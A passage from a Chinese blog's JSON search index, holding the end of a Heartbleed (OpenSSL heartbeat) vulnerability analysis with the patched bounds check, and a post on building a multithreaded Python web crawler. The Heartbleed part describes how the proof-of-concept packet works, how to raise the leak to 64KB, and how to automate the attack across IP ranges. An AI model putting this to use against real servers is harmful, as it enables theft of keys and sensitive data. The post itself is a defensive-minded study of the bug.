寻找数据填充。漏洞就此产生~漏洞利用先简单看下利用脚本。hb是构造的心跳包，01代表请求类型，4000是length的值，这里4000化为2进制为16384共16kb，其实完全可以ffff这样一次可以得到64kb的数据。PoC的整体思路：使用socket创建TCP连接-&gt;建立ssl握手（发送Clienthello包和接受ServerHello包）-&gt;发送恶意heartbeat包-&gt;输出异常数据。具体实现细节就不分析了。可以将脚本进行一些改动，比如循环遍历数据，格式化保存数据，再加上循环ip范围段实现自动化检测和利用等等。漏洞修复。漏洞产生的原因很简单，所以修补起来也很容易，找到修补后的openssl-1.0.1g版本。/*Readtypeandpayloadlengthfirst*/if(1+2+16&amp;gt;s-&amp;gt;s3-&amp;gt;rrec.length)return0;/*silentlydiscard*/hbtype=*p++;n2s(p,payload);if(1+2+payload+16&amp;gt;s-&amp;gt;s3-&amp;gt;rrec.length)return0;/*silentlydiscardperRFC6520sec.4*/pl=p;代码首先对心跳包的数据是否为零进行判断，16为padding填充值的最小长度，1+2+16为一个心跳包中必有的参数（不包括数据）,然后对心跳包的长度是否足够进行判断。就是那么简单~一些安全思考。安全的本质是信任问题。每个漏洞都在体现这个本质，而在这次漏洞中，就是信任了length的值，但是这个信任基础被打破，黑客可以修改length值构造数据包进行攻击。又一个缓冲区溢出。我觉得这个年代缓冲区溢出已经很少见了，但是这个漏洞机制如此简单，对内存的申请如此随意，表现出来的安全意识实在有些薄弱。逃过日志记录的入侵。日志对于安全监测的重要性的不言而喻。但是服务器不记录heartbeat包异常，所造成的危害也就完全无法估量。虽然记录每个心跳包的话显得过于庞大，但是可以按一定规则记录心跳包的发送频率的吧，起码能让whiletrue这种无脑dump数据有些作用。实现不遵循协议。RFC6520中规定了heartbeat包的长度不能超过2^14（16384），如果数据过长，这个heartbeat请求应该被丢弃（所以PoC的作者把length值设为4000）。Openssl只在发送请求的客户端进行了检查，否则每次泄漏内存只是16kb而不是64kb。虽然这对于漏洞的信息泄漏没有多少限制（whiletrue。。。），但是不遵循协议带来安全隐患是没法预测的。对基础设施的安全关注度不够。作为让网络变得更安全的安全产品，却自身出现了问题，才会在网络上掀起轩然大波，但看到openssl开发团队人数之少，经费之短缺，很难把责任都推向他们。一个安全的互联网，不应该只是靠一些人的努力。一些疑惑。PoC里心跳包的第一排数据是什么东西，sslv3记录格式一开始就是数据类型的呀。Length值的存在意义，如果要使用到一段数据的长度值，为啥还要对其进行一个声明，对它直接进行验证并保存进length里面难道不是一个很好的办法？不知道这是ssl协议的要求还是openssl实现的做法。为什么一次能泄漏的数据是64kb。一开始以为是memcpy函数的限制，后来没查到资料。但是查到应该是C的编译限制，C源程序编译生成的代码和数据量都不能超过64KB。待确认。随机读取内存获得敏感信息的几率。测试结果让我很吃惊，几乎每次请求都能得到敏感数据，现在甚至有成功恢复密钥的消息。不知道为什么SSLv3记录附近能有这么多的好东西。乌云文章里称C语言的局限性很大，安全编程很难。我的理解是C语言的内存的操控太灵活，使得容易出问题。其他方面还不能很好的领悟。附：网上找到的一幅对漏洞原理说的很形象的漫画","link":"https://pikez.github.io/post/openssl-heartbleed-lou-dong-fen-xi/"},{"title":"Python 爬虫总结","content":"spider.py-uurl-ddeep-flogfile-lloglevel(1-5)--testself-threadnumber--dbfilefilepath--key=”HTML5”这是爬虫实现的基本功能。参数说明：-u指定爬虫开始地址-d指定爬虫深度-l日志记录文件记录详细程度，数字越大记录越详细，可选参数，默认spider.log--thread指定线程池大小，多线程爬取页面，可选参数，默认10--dbfile存放结果数据到指定的数据库（sqlite）文件中--key页面内的关键词，获取满足该关键词的网页，可选参数，默认为所有页面--testself程序自测，可选参数于是构思结构,大致将代码分成几个部分：总体思路抓取函数（负责每个URL对应的保存，解析，搜索链接并返回,对于以后每个URL只需调用这个函数即可）；日志函数（负责记录日志）；线程和线程池类（负责提供线程池机制，并发抓取网页）；数据库类（负责保存网页）；主函数（负责深度控制和其他）；关于爬虫算法开始并没有搜索相关的知识，按照自己的想法构思了抓取页面的URL到列表，再用此列表进行下一层的抓取的思路，后来明白了这是广度优先搜索。可有因为这种算法，导致后面编写的时候遇上语法上的困难，对python的掌握还是没我想像中的熟练。关于抓取首先，使用了Requests库而不是urllib2，是由于它的简单易用，易扩展和处理编码问题等等。然后，编码问题，页面的编码老是千奇百怪，还好beautifulsoup可以把网页指定编码保存，该模块对于html页面的解析也是简单易用接着就是re模块正则表达式查找关键字，没考虑汉字作key的情况，囧~以后补上关于线程池和多线程这是这次遇到的最大的困难，通过找资料学习以后，大致明白了线程池机制，然后摸着石头过河，实现了一个线程池，然而因为每次抓取都要返回一个链接列表，在线程中又找不到办法返回这个列表。。。一度陷入困境，把列表作为全局变量保存等办法每一个能搞定，折腾两天后放弃了，查了下刁哥说的ThreadPool模块，果然简单，而且提供了回调函数，能够返回线程中函数的返回值。也就作罢，以后看看这模块的源码，再自己实现一下关于数据库Sqlite3内置在python里面比较轻量，使用挺轻松的。但对于多线程的支持却不太好。如果所有线程使用一个数据库连接，会导致ProgramError，把check_same_Threading设会False可以避免报错，却是不安全的，会丢失数据。如果每个线程创建一个数据库连接，会导致Databaseislocked错误，大概不支持同一时间多线程写入。尝试给数据库上锁，将未保存的数据放入列表，最后来保存等方法后，才想到一个简单的办法：在触发异常后，再次调用插入数据的函数，直至成功，让程序自己找插入数据的时间点。最后测试没有丢失任何数据关于深度控制整个程序可以这样拓展：抓取一个网页--&gt;抓取一个列表内的网页（即一层）--&gt;抓取预定深度的网页：Foriinrange(层数）:Forxinrange(URL列表）：Spider（）（多线程执行）测试Sina.com.cn两层一共1635个URL（下一层119828，吓哭。。）保存数据约300M，10线程约半小时完成。一些小困难和收获起初使用html=urllib2.urlopen时，没想到该html对象只能使用一次，再次使用就返回了None，程序没法往下走，各种纠结。在测试日志处理时发现日志会有重复现象，在网上找不到任何解决办法，看了文档后才知道原因是没有调用logger.removeHandler去移除处理器。访问网页的时候，感觉仅仅使用headers还不够，抓久了会被禁止访问，考虑使用代理。编写过程中一直有考虑性能问题，想避免各种复杂或不必要的实现方式，无奈水平不行，慢慢进行改进。出问题一定不能只在google里找答案，不然多数情况会掉进坑，看官方文档是最好的解决办法（虽然英语渣出翔）对各种模块进行了学习，甚至有琢磨源代码的欲望。爬虫功能基本实现，性能和代码简洁程度等还可以继续改进，有时间加入自己实现的线程池。源代码就暂时不贴了。","link":"https://pikez.github.io/post/python-pa-chong-zong-jie/"}]}